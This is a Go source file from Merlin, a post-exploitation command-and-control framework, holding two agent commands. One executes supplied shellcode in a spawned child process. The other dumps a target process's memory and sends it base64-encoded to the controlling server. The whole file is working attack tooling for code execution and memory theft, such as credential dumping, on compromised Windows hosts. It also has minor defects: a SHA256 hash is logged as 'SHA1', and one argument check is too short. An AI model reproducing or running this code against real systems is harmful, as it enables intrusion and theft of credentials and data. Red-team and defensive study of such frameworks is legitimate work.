// Merlin is a post-exploitation command and control framework.
// This file is part of Merlin.
// Copyright (C) 2021  Russel Van Tuyl

// Merlin is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.

// Merlin is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.

// You should have received a copy of the GNU General Public License
// along with Merlin.  If not, see <http://www.gnu.org/licenses/>.

package commands

import (
	// Standard
	"crypto/sha256"
	"encoding/base64"
	"fmt"
	"io"
	"strconv"

	// Internal
	"github.com/Ne0nd0g/merlin/pkg/agent/cli"
	"github.com/Ne0nd0g/merlin/pkg/jobs"
)

// CreateProcess spawns a child process with anonymous pipes, executes shellcode in it, and returns the output from the executed shellcode
func CreateProcess(cmd jobs.Command) jobs.Results {
	cli.Message(cli.NOTE, fmt.Sprintf("Executing CreateProcess module: %s", cmd.Command))

	var results jobs.Results
	var err error

	// Ensure the provided args are valid
	if len(cmd.Args) < 2 {
		//not enough args
		results.Stderr = "not enough arguments provided to the createProcess module to dump a process"
		return results
	}

	// 1. Shellcode
	// 2. SpawnTo Executable
	// 3. SpawnTo Arguments
	results.Stdout, results.Stderr, err = ExecuteShellcodeCreateProcessWithPipe(cmd.Args[0], cmd.Args[1], cmd.Args[2])
	if err != nil {
		results.Stderr = err.Error()
	}

	if results.Stderr == "" {
		cli.Message(cli.SUCCESS, results.Stdout)

	} else {
		cli.Message(cli.WARN, results.Stderr)
	}
	return results
}

// MiniDump is the top-level function used to receive a job and subsequently execute a Windows memory dump on the target process
// The function returns the memory dump as a file upload to the server
func MiniDump(cmd jobs.Command) (jobs.FileTransfer, error) {

	cli.Message(cli.NOTE, "Received Minidump request")

	//ensure the provided args are valid
	if len(cmd.Args) < 2 {
		//not enough args
		return jobs.FileTransfer{}, fmt.Errorf("not enough arguments provided to the Minidump module to dump a process")

	}
	process := cmd.Args[0]
	pid, err := strconv.ParseInt(cmd.Args[1], 0, 32)
	if err != nil {
		return jobs.FileTransfer{}, fmt.Errorf("minidump module could not parse PID as an integer:%s\r\n%s", cmd.Args[1], err.Error())

	}

	tempPath := ""
	if len(cmd.Args) == 3 {
		tempPath = cmd.Args[2]
	}

	// Get minidump
	miniD, miniDumpErr := miniDump(tempPath, process, uint32(pid))

	//copied and pasted from upload func, modified appropriately
	if miniDumpErr != nil {
		return jobs.FileTransfer{}, fmt.Errorf("there was an error executing the miniDump module:\r\n%s", miniDumpErr.Error())
	}

	fileHash := sha256.New()
	_, errW := io.WriteString(fileHash, string(miniD["FileContent"].([]byte)))
	if errW != nil {
		cli.Message(cli.WARN, fmt.Sprintf("There was an error generating the SHA256 file hash e:\r\n%s", errW.Error()))
	}

	cli.Message(cli.NOTE, fmt.Sprintf("Uploading minidump file of size %d bytes and a SHA1 hash of %x to the server",
		len(miniD["FileContent"].([]byte)),
		fileHash.Sum(nil)))

	return jobs.FileTransfer{
		FileLocation: fmt.Sprintf("%s.%d.dmp", miniD["ProcName"], miniD["ProcID"]),
		FileBlob:     base64.StdEncoding.EncodeToString(miniD["FileContent"].([]byte)),
		IsDownload:   true,
	}, nil
}
